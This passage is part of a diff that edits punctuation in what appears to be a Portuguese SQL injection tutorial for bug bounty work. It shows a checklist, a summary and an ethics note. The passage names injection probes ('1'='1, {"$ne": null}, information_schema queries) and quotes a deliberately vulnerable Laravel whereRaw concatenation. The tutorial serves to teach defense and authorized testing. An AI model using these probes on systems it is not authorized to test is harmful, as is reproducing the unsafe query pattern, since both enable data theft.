 - [ ] Fiz **fingerprint** do SGBD (`@@version` / `version()`) e ajustei a sintaxe (concat, comentário, delay).
-- [ ] Extraí **metadados** (`database()`, `information_schema`) — sem dumpar PII real.
+- [ ] Extraí **metadados** (`database()`, `information_schema`) sem dumpar PII real.
 - [ ] Para JSON/Mongo, testei **operadores** (`{"$ne": null}`).
 - [ ] Confirmei que SQLi está **no escopo** do programa.
 
@@ -519,14 +519,14 @@ User::whereRaw("email = '" . $request->email . "'")->first();
 
 - SQLi é a confusão entre **código e dado**: input do usuário tratado como comando.
 - **In-band** (UNION/erro) entrega o dado na resposta; **blind** (boolean/tempo) você infere; **OAST** usa canal externo.
-- A sintaxe muda por SGBD — **fingerprint primeiro**, payload depois.
+- A sintaxe muda por SGBD: **fingerprint primeiro**, payload depois.
 - A defesa que mata a classe inteira é **query parametrizada**. WAF e escape são reforço, não solução.
 
 > 💡 **Dica de ouro:** se uma **aspa** quebra a página e `'1'='1` vs `'1'='2` mudam a resposta, você tem SQLi — pare de adivinhar e **prove** com `database()`/`@@version`. E na hora de defender: se a string da sua query **muda** conforme o input do usuário, você está concatenando errado. Query parametrizada é uma string **fixa** com valores ao lado.
 
 ## Nota ética
 
-Tudo aqui é para **testes autorizados** — bug bounty dentro do escopo, pentests contratados e labs legais. SQLi é especialmente perigoso porque um payload mal calibrado (ou o `sqlmap` agressivo) pode **corromper ou apagar dados reais** de usuários. Em alvo de produção: prove a leitura de **metadados** (versão, nome do banco) e **pare** — não dumpe PII, não escreva, não delete. Injetar SQL em sistema de terceiros sem autorização é crime, e desnecessário quando há tanto lab bom pra treinar. Use pra proteger, reportar com responsabilidade e ensinar.
+Tudo aqui é para **testes autorizados**: bug bounty dentro do escopo, pentests contratados e labs legais. SQLi é especialmente perigoso porque um payload mal calibrado (ou o `sqlmap` agressivo) pode **corromper ou apagar dados reais** de usuários. Em alvo de produção: prove a leitura de **metadados** (versão, nome do banco) e **pare**. Não dumpe PII, não escreva, não delete. Injetar SQL em sistema de terceiros sem autorização é crime, e desnecessário quando há tanto lab bom pra treinar. Use pra proteger, reportar com responsabilidade e ensinar.
 
 ## Referências
 
